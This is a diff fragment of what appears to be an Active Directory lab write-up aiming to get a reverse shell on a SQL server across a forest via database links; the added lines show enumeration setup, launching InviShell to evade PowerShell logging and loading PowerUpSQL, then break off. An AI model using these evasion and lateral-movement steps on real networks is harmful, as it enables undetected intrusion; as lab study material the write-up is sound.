@@ -16,3 +16,19 @@ Get a reverse shell on a `db-sqlsrv` in `db.local` forest by abusing database li
 
 ## Enumeration
 
+Import `PowerUpSQL.ps1` using InviShell:
+
+```
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+```
+. C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.ps1
+```
+
+![picture 17](images/364cb35bfb53920774829881908b441c299842f4cf0a9e9e9a38c7d1cf582a01.png)  
+
+
+<br/>
+
+Then 
